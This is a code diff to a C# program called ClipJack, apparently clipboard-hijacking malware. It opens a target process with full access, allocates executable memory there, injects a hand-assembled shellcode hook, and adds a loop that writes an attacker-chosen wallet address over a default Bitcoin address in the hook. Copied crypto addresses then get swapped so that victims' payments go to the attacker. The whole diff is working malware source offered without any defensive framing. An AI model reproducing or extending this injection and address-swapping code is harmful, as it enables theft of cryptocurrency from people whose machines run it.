@@ -110,6 +110,7 @@ namespace ClipJack
             byte[] LongJump = { 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
             IntPtr wHandle = OpenProcess((int)MemoryProtection.Proc_All_Access, false, proc.Id);
 
+            //Code Cave
             #region ClipJack
             byte[] ClipHook = {0xEB, 0x59, 0x31, 0x00, 0x39, 0x00, 0x68, 0x00, 0x4E, 0x00, 0x38, 0x00, 0x71, 0x00, 0x6A, 0x00, 0x51, 0x00, 0x57, 0x00, 0x48,
                                0x00, 0x33, 0x00, 0x66, 0x00, 0x4C, 0x00, 0x71, 0x00, 0x70, 0x00, 0x70, 0x00, 0x43, 0x00, 0x67, 0x00, 0x77, 0x00, 0x38, 0x00,
@@ -128,6 +129,13 @@ namespace ClipJack
                                0x90, 0x90, 0x90, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };  //the ASM code cave (not the best... but it works)
             #endregion ClipJack
 
+            //Replace default BTC address with WalletAddress
+            for(int i = 0; i < WalletAddress.Length; i+=2)
+            {
+                ClipHook[2 + i] = (byte)WalletAddress[i/2];
+                ClipHook[2 + i +1] = 0x00;
+            }
+
             //Merge PatchedBytes & ClipHook into a new buffer
             byte[] payload = new byte[PatchLocation.Length + ClipHook.Length];
             for (int i = 0; i < payload.Length; i++)
@@ -140,7 +148,7 @@ namespace ClipJack
 
             //Allocate our memory location already, we need the return value to calculate stuff
             long hAlloc = (long)VirtualAllocEx(wHandle, 0, (uint)payload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
-            Console.WriteLine("CodeCave[" + proc.Id + "] is @ 0x" + hAlloc.ToString("X"));
+            Console.WriteLine("CodeCave[" + proc.Id.ToString("X") + "] is @ 0x" + hAlloc.ToString("X"));
 
             //fix pointer to Wallet address
             WriteQWORDinBuffer(payload, hAlloc + PatchLocation.Length + 0x02, PatchLocation.Length + 0xF7);
